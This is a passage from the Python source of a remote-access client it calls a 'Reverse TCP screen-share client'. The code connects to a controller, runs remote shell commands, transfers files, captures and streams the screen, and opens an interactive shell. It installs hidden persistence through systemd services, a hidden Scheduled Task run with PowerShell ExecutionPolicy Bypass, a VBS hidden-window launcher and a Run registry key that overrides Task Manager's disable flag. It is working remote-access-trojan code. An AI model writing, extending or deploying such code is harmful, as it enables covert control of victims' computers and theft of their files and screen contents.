        return subprocess.run(cmd, capture_output=True, text=True).returncode == 0
    except (OSError, subprocess.SubprocessError):
        return False


def _service_body(exec_cmd, silent, log_file, after, wanted, user_line):
    if log_file:
        out = 'append:{}'.format(os.path.abspath(log_file))
    elif silent:
        out = 'null'
    else:
        out = 'journal'
    after_line = '' if after is None else 'After={}\n'.format(after)
    return (
        "[Unit]\n"
        "Description=Auto-run for {}\n"
        "{}"
        "\n"
        "[Service]\n"
        "Type=simple\n"
        "{}ExecStart={}\n"
        "WorkingDirectory={}\n"
        "Restart=on-failure\n"
        "RestartSec=3\n"
        "StandardInput=null\n"
        "StandardOutput={}\n"
        "StandardError={}\n"
        "\n"
        "[Install]\n"
        "WantedBy={}\n"
    ).format(AUTORUN_NAME, after_line, user_line, exec_cmd,
             os.path.dirname(SCRIPT_PATH), out, out, wanted)


def setup_linux(ip, port, silent, log_file):
    if not shutil.which('systemctl'):
        print('[-] systemd is not available on this system.')
        return False

    python = sys.executable or shutil.which('python3') or 'python3'
    exec_cmd = '{} {} {} {}'.format(python, SCRIPT_PATH, ip, port)
    service_name = 'autorun-{}.service'.format(AUTORUN_NAME)

    # Prefer a user service: it starts with the desktop session, so screen
    # capture works after a reboot too. (autorunner.py's Omarchy behaviour,
    # extended to any distro with a running systemd user manager.)
    if is_omarchy() or _user_manager_running():
        svc_dir = os.path.expanduser('~/.config/systemd/user')
        os.makedirs(svc_dir, exist_ok=True)
        if is_omarchy() or run_quiet(['systemctl', '--user', 'is-active', '--quiet',
                                      'graphical-session.target']):
            after = wanted = 'graphical-session.target'
        else:
            # no graphical-session.target on this desktop -> plain login start
            after, wanted = None, 'default.target'
        svc_path = os.path.join(svc_dir, service_name)
        try:
            with open(svc_path, 'w') as f:
                f.write(_service_body(exec_cmd, silent, log_file, after, wanted, ''))
        except OSError as e:
            print('[-] Cannot write service: {}'.format(e))
            return False
        run_quiet(['systemctl', '--user', 'daemon-reload'])
        if not run_quiet(['systemctl', '--user', 'enable', '--now', service_name]):
            print('[-] systemctl --user enable failed.')
            return False
        print('[+] User service: {}'.format(svc_path))
        print('[+] Starts with your session after reboot, no terminal window.')
        return True

    # No user manager (SSH-only / server style box): system service, needs root
    if os.geteuid() != 0:
        print('[-] Need root for a system service: re-run with sudo.')
        return False
    run_user = os.environ.get('SUDO_USER', 'root')
    user_line = '' if run_user == 'root' else 'User={}\n'.format(run_user)
    svc_path = '/etc/systemd/system/{}'.format(service_name)
    try:
        with open(svc_path, 'w') as f:
            f.write(_service_body(exec_cmd, silent, log_file,
                                  'network.target', 'multi-user.target', user_line))
    except OSError as e:
        print('[-] Cannot write service: {}'.format(e))
        return False
    run_quiet(['systemctl', 'daemon-reload'])
    if not run_quiet(['systemctl', 'enable', '--now', service_name]):
        print('[-] systemctl enable failed.')
        return False
    print('[+] System service: {}'.format(svc_path))
    print('[+] Runs at boot with no terminal window.')
    return True


def _pythonw_path():
    """Locate pythonw.exe (the GUI-subsystem interpreter = no console window)."""
    exe = sys.executable or ''
    if exe:
        d = os.path.dirname(exe)
        for name in ('pythonw.exe', 'pythonw'):
            cand = os.path.join(d, name)
            if os.path.exists(cand):
                return cand
    for name in ('pythonw.exe', 'pythonw'):
        p = shutil.which(name)
        if p:
            return p
    return None


def _make_vbs(executable, arg_path, extra_args):
    """VBS launcher that starts a process with a hidden window."""
    base = os.path.join(os.environ.get('LOCALAPPDATA') or tempfile.gettempdir(), 'AutoRunner')
    os.makedirs(base, exist_ok=True)
    vbs_path = os.path.join(base, 'AutoRun_{}.vbs'.format(AUTORUN_NAME))
    inner = '"{}" "{}"'.format(executable, arg_path)
    if extra_args:
        inner += ' ' + extra_args
    escaped = inner.replace('"', '""')
    content = ('Set WshShell = CreateObject("WScript.Shell")\r\n'
               'WshShell.Run "{}", 0, False\r\n').format(escaped)
    with open(vbs_path, 'w', encoding='utf-8') as f:
        f.write(content)
    return vbs_path


def _windows_command(ip, port, silent):
    """Return (execute, arguments) for the Windows launcher."""
    args = '{} {}'.format(ip, port)
    if silent:
        pyw = _pythonw_path()
        if pyw:
            return pyw, '"{}" {}'.format(SCRIPT_PATH, args)
        py = sys.executable or shutil.which('python') or 'python'
        vbs = _make_vbs(py, SCRIPT_PATH, args)
        return 'wscript.exe', '"{}"'.format(vbs)
    py = sys.executable or shutil.which('python') or 'python'
    return py, '"{}" {}'.format(SCRIPT_PATH, args)


def _register_task_powershell(task_name, execute, arguments):
    ps = '\n'.join([
        "$ErrorActionPreference = 'Stop'",
        "$exe = '{}'".format(execute.replace("'", "''")),
        "$arg = '{}'".format(arguments.replace("'", "''")),
        ("$action = New-ScheduledTaskAction -Execute $exe -Argument $arg" if arguments
         else "$action = New-ScheduledTaskAction -Execute $exe"),
        "$trigger = New-ScheduledTaskTrigger -AtLogOn -User $env:USERNAME",
        "$settings = New-ScheduledTaskSettingsSet -Hidden -AllowStartIfOnBatteries "
        "-DontStopIfGoingOnBatteries -StartWhenAvailable -ExecutionTimeLimit ([TimeSpan]::Zero)",
        "$principal = New-ScheduledTaskPrincipal -UserId $env:USERNAME "
        "-LogonType Interactive -RunLevel Limited",
        "Register-ScheduledTask -TaskName '{}' -Action $action -Trigger $trigger "
        "-Settings $settings -Principal $principal -Force | Out-Null".format(task_name),
    ])
    fd, path = tempfile.mkstemp(suffix='.ps1', text=True)
    try:
        with os.fdopen(fd, 'w', encoding='utf-8') as f:
            f.write(ps)
        return run_quiet(['powershell', '-NoProfile', '-ExecutionPolicy', 'Bypass', '-File', path])
    finally:
        try:
            os.remove(path)
        except OSError:
            pass


def _register_task_schtasks(task_name, execute, arguments):
    tr = '"{}" {}'.format(execute, arguments).strip()
    return run_quiet(['schtasks', '/Create', '/TN', task_name, '/TR', tr,
                      '/SC', 'ONLOGON', '/RL', 'LIMITED', '/F'])


def _windows_registry_fallback(task_name, execute, arguments):
    try:
        import winreg
    except ImportError:
        print('[-] winreg unavailable.')
        return False
    cmd = '"{}" {}'.format(execute, arguments) if arguments else '"{}"'.format(execute)
    run_key = r'Software\Microsoft\Windows\CurrentVersion\Run'
    approved_key = r'Software\Microsoft\Windows\CurrentVersion\Explorer\StartupApproved\Run'
    try:
        k = winreg.CreateKeyEx(winreg.HKEY_CURRENT_USER, run_key, 0, winreg.KEY_SET_VALUE)
        winreg.SetValueEx(k, task_name, 0, winreg.REG_SZ, cmd)
        winreg.CloseKey(k)
        try:                              # clear a "disabled" flag Task Manager may have set
            ka = winreg.OpenKey(winreg.HKEY_CURRENT_USER, approved_key, 0, winreg.KEY_SET_VALUE)
            winreg.SetValueEx(ka, task_name, 0, winreg.REG_BINARY,
                              bytes([0x02, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0]))
            winreg.CloseKey(ka)
        except FileNotFoundError:
            pass
        print('[+] Registry entry: HKCU\\{}\\{}'.format(run_key, task_name))
        return True
    except OSError as e:
        print('[-] Registry error: {}'.format(e))
        return False


def setup_windows(ip, port, silent):
    task_name = 'AutoRun_{}'.format(AUTORUN_NAME)
    execute, arguments = _windows_command(ip, port, silent)

    if _register_task_powershell(task_name, execute, arguments):
        print("[+] Scheduled Task '{}' created (hidden, at logon).".format(task_name))
    elif _register_task_schtasks(task_name, execute, arguments):
        print("[+] Scheduled Task '{}' created via schtasks.".format(task_name))
    else:
        print('[!] schtasks failed; falling back to the registry...')
        if not _windows_registry_fallback(task_name, execute, arguments):
            return False

    run_quiet(['schtasks', '/Run', '/TN', task_name])
    return True


def install_autostart(ip, port, silent=True, log_file=None):
    """Set this client up to start automatically after reboot/logon.
    Returns the setup log as text (also used as the reply to the controller)."""
    buf = io.StringIO()
    with contextlib.redirect_stdout(buf):
        print('[*] OS: {}'.format(get_os_info()))
        print('[*] Mode: {}'.format('silent (no window)' if silent else 'visible'))
        print('[*] Program: {} {} {}'.format(SCRIPT_PATH, ip, port))
        os_type = platform.system().lower()
        try:
            if os_type == 'linux':
                ok = setup_linux(ip, port, silent, log_file)
            elif os_type == 'windows':
                ok = setup_windows(ip, port, silent)
            else:
                print('[-] Unsupported OS: {}'.format(platform.system()))
                ok = False
        except Exception as e:
            print('[-] Unexpected error: {}'.format(e))
            ok = False
        if ok:
            print('[+] Done. The client will start automatically after reboot/logon.')
            print('    Nothing will appear on screen - you can close the terminal window.')
    return buf.getvalue().strip()


def remove_autostart():
    """Remove the auto-start entry. Returns the log as text."""
    buf = io.StringIO()
    with contextlib.redirect_stdout(buf):
        os_type = platform.system().lower()
        service_name = 'autorun-{}.service'.format(AUTORUN_NAME)
        task_name = 'AutoRun_{}'.format(AUTORUN_NAME)

        if os_type == 'linux':
            removed = False
            user_path = os.path.expanduser('~/.config/systemd/user/{}'.format(service_name))
            if os.path.exists(user_path):
                # --now also stops the auto-started instance, so unpersist
                # leaves nothing running in the background
                run_quiet(['systemctl', '--user', 'disable', '--now', service_name])
                try:
                    os.remove(user_path)
                    removed = True
                except OSError as e:
                    print('[-] Could not remove {}: {}'.format(user_path, e))
                run_quiet(['systemctl', '--user', 'daemon-reload'])
            system_path = '/etc/systemd/system/{}'.format(service_name)
            if os.path.exists(system_path):
                if os.geteuid() == 0:
                    run_quiet(['systemctl', 'disable', '--now', service_name])
                    try:
                        os.remove(system_path)
                        removed = True
                    except OSError as e:
                        print('[-] Could not remove {}: {}'.format(system_path, e))
                    run_quiet(['systemctl', 'daemon-reload'])
                else:
                    print('[-] A system service exists - remove it with sudo.')
            print('[+] Autostart removed.' if removed else '[-] No autostart entry found.')
            print('[+] The auto-started client instance was stopped too.')

        elif os_type == 'windows':
            run_quiet(['schtasks', '/Delete', '/TN', task_name, '/F'])
            try:
                import winreg
                for path in (r'Software\Microsoft\Windows\CurrentVersion\Run',
                             r'Software\Microsoft\Windows\CurrentVersion\Explorer\StartupApproved\Run'):
                    try:
                        k = winreg.OpenKey(winreg.HKEY_CURRENT_USER, path, 0, winreg.KEY_SET_VALUE)
                        try:
                            winreg.DeleteValue(k, task_name)
                        except FileNotFoundError:
                            pass
                        winreg.CloseKey(k)
                    except FileNotFoundError:
                        pass
            except ImportError:
                pass
            vbs = os.path.join(os.environ.get('LOCALAPPDATA') or tempfile.gettempdir(),
                               'AutoRunner', 'AutoRun_{}.vbs'.format(AUTORUN_NAME))
            try:
                os.remove(vbs)
            except OSError:
                pass
            print('[+] Windows autostart removed.')
            print('[+] A running client stays up until closed or rebooted.')

        else:
            print('[-] Unsupported OS: {}'.format(os_type))
    return buf.getvalue().strip()


def parse_args(argv):
    """client.py [controller_ip] [controller_port]
                [--persist | --remove-persist] [--visible] [--log-file PATH]"""
    ip = DEFAULT_IP
    port = DEFAULT_PORT
    persist = remove = visible = False
    log_file = None
    positional = []
    i = 0
    while i < len(argv):
        a = argv[i]
        if a == '--persist':
            persist = True
        elif a in ('--remove-persist', '--remove'):
            remove = True
        elif a == '--visible':
            visible = True
        elif a == '--log-file' and i + 1 < len(argv):
            i += 1
            log_file = argv[i]
        else:
            positional.append(a)
        i += 1
    if positional:
        ip = positional[0]
    if len(positional) > 1:
        try:
            port = int(positional[1])
        except ValueError:
            pass
    return ip, port, persist, remove, visible, log_file


def main():
    if any(a in ('-h', '--help') for a in sys.argv[1:]):
        print('usage: python client.py [controller_ip] [controller_port]')
        print('       --persist          install auto-start (silent) for this client')
        print('       --visible          with --persist: show a window instead')
        print('       --log-file PATH    with --persist (Linux): keep a log file')
        print('       --remove-persist   remove the auto-start entry')
        return

    target_ip, target_port, do_persist, do_remove, visible, log_file = parse_args(sys.argv[1:])

    print("[+] Reverse TCP screen-share client v18")

    if do_remove:
        print(remove_autostart())
        return

    if do_persist:
        print(install_autostart(target_ip, target_port, silent=not visible, log_file=log_file))
        return

    ensure_dependencies()

    # Persistent working directory: survives reconnects
    current_dir = os.getcwd()

    # Outer loop: runs until this program is closed or the controller says exit
    while True:
        # Keep trying until the controller is up, so the start order doesn't
        # matter. This loop never gives up: only 'exit' from the controller or
        # closing this program stops the client.
        failures = 0
        while True:
            try:
                client_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                client_socket.connect((target_ip, target_port))
                break
            except Exception as e:
                failures += 1
                if failures == 1 or failures % 10 == 0:
                    print("[!] Controller not reachable at {}:{} ({}), retrying every {}s...".format(
                        target_ip, target_port, e, RETRY_DELAY))
                time.sleep(RETRY_DELAY)

        print("[+] Reverse TCP shell connected to {}:{}".format(target_ip, target_port))
        _tune_socket(client_socket)      # fast reconnect when this controller dies

        # Tell the controller what this machine has (OS, session, capture tools)
        # so it can explain any missing dependency with exact install commands.
        try:
            send_msg(client_socket, {'type': 'hello', 'env': environment_report()})
        except OSError:
            pass

        # Serve commands until the controller goes away (then reconnect and wait)
        stop = False
        del DEFERRED[:]                      # nothing left over from a dead session
        with CANCELED_LOCK:
            CANCELED.clear()
        try:
            while True:
                if DEFERRED:
                    # Requests read while a command was running - in order.
                    msg = DEFERRED.pop(0)
                else:
                    msg = recv_msg(client_socket)
                if msg is None:              # controller closed the connection
                    print("[!] Controller closed the connection. Reconnecting...")
                    break

                mtype = msg.get('type')
                req_id = msg.get('id')

                # The controller stopped this request (Ctrl+Z / 'stop') before we
                # got to it: answer and move on instead of running it.
                if mtype not in ('exit', 'hello', 'cancel', 'cmd_kill', 'screenshare_stop') \
                        and _is_canceled(req_id):
                    why = _forget_canceled(req_id) or 'Ctrl+Z'
                    send_msg(client_socket, {'type': 'output', 'id': req_id,
                                             'data': '[client] canceled ({})'.format(why)})
                    continue

                if mtype == 'exit':
                    stop_stream(wait=0.5)
                    try:
                        send_msg(client_socket, {'type': 'output', 'id': req_id,
                                                 'data': '[client] shutting down'})
                    except OSError:
                        pass
                    stop = True
                    break

                if mtype == 'cmd':
                    command = msg.get('data', '')
                    if not command.strip():
                        continue

                    cd_result = change_dir(command, current_dir)
                    if cd_result is not None:
                        current_dir, output = cd_result
                        send_msg(client_socket, {'type': 'output', 'id': req_id,
                                                 'data': output if output is not None else '[no output]'})
                        continue

                    try:
                        text, stop_requested = run_command(client_socket, command, current_dir, req_id)
                    except Exception as e:
                        text, stop_requested = 'command failed: {}'.format(e), False
                    if not text:
                        text = '[no output]'
                    send_msg(client_socket, {'type': 'output', 'id': req_id, 'data': text})
                    if stop_requested:
                        stop = True
                        break
                    continue

                if mtype in ('cmd_kill', 'cancel'):
                    continue                # nothing running: nothing to stop

                if mtype == 'download':
                    path = os.path.expanduser(msg.get('path', ''))
                    real_path = path if os.path.isabs(path) else os.path.join(current_dir, path)
                    try:
                        if os.path.getsize(real_path) > MAX_FILE:
                            send_msg(client_socket, {'type': 'error', 'id': req_id, 'data': 'File too large (max {} MB)'.format(MAX_FILE // (1024 * 1024))})
                            continue
                        with open(real_path, 'rb') as f:
                            data = base64.b64encode(f.read()).decode('ascii')
                        send_msg(client_socket, {'type': 'file', 'id': req_id, 'name': os.path.basename(real_path), 'data': data})
                    except Exception as e:
                        send_msg(client_socket, {'type': 'error', 'id': req_id, 'data': 'download failed: {}'.format(e)})
                    continue

                if mtype == 'upload':
                    name = os.path.expanduser(msg.get('name', 'uploaded.bin'))
                    dest = name if os.path.isabs(name) else os.path.join(current_dir, name)
                    try:
                        data = base64.b64decode(msg.get('data', ''))
                        with open(dest, 'wb') as f:
                            f.write(data)
                        send_msg(client_socket, {'type': 'output', 'id': req_id, 'data': 'Saved to {} ({} bytes)'.format(dest, len(data))})
                    except Exception as e:
                        send_msg(client_socket, {'type': 'error', 'id': req_id, 'data': 'upload failed: {}'.format(e)})
                    continue

                if mtype == 'screenshot':
                    take_screenshot(client_socket, req_id)
                    continue

                if mtype == 'persist':
                    try:
                        report = install_autostart(target_ip, target_port)
                    except Exception as e:
                        report = 'persist failed: {}'.format(e)
                    send_msg(client_socket, {'type': 'output', 'id': req_id, 'data': report})
                    continue

                if mtype == 'unpersist':
                    try:
                        report = remove_autostart()
                    except Exception as e:
                        report = 'unpersist failed: {}'.format(e)
                    send_msg(client_socket, {'type': 'output', 'id': req_id, 'data': report})
                    continue

                if mtype == 'screenshare':
                    # One share at a time: stop the previous one, then stream in
                    # a thread so commands keep working while the screen is live.
                    stop_stream()
                    stream_stop = threading.Event()
                    stream_thread = threading.Thread(
                        target=_stream_worker,
                        args=(client_socket, msg.get('fps'), stream_stop, req_id),
                        name='screenshare', daemon=True)
                    with STREAM_LOCK:
                        STREAM['stop'] = stream_stop
                        STREAM['thread'] = stream_thread
                        STREAM['id'] = req_id
                    print('[+] Screen share started ({} fps)'.format(msg.get('fps') or 'max'))
                    stream_thread.start()
                    continue

                if mtype == 'screenshare_stop':
                    if stop_stream():
                        print('[+] Screen share stopped.')
                    else:
                        send_msg(client_socket, {'type': 'output', 'id': req_id,
                                                 'data': '[client] no screen share is running'})
                    continue

                if mtype == 'shell':
                    try:
                        shell_port = int(msg.get('port'))
                    except (TypeError, ValueError):
                        send_msg(client_socket, {'type': 'error', 'id': req_id,
                                                 'data': 'shell: controller sent no valid port'})
                        continue
                    start_interactive_shell(client_socket, target_ip, shell_port, req_id)
                    continue

                send_msg(client_socket, {'type': 'error', 'id': req_id,
                                         'data': 'unknown message type: {}'.format(mtype)})
        except OSError as e:
            print("[!] Connection error: {}. Reconnecting...".format(e))
        except Exception as e:                  # never let one bad message kill us
            print("[!] Unexpected error: {}. Reconnecting...".format(e))

        stop_stream(wait=0.5)                   # a share cannot outlive its socket
        try:
            client_socket.close()
        except OSError:
            pass

        if stop:
            print("[+] Controller requested shutdown. Exiting.")
            break
        # otherwise: loop back and try to reconnect


if __name__ == "__main__":
    # The client is meant to stay alive: a crash restarts it unless 'exit'
    # was requested from the controller (then main() returns normally).
    while True:
        try:
            main()
            break
        except KeyboardInterrupt:
            break
        except Exception as e:
            print("[!] Unexpected fatal error: {} - restarting in {}s...".format(e, RETRY_DELAY))
            time.sleep(RETRY_DELAY)
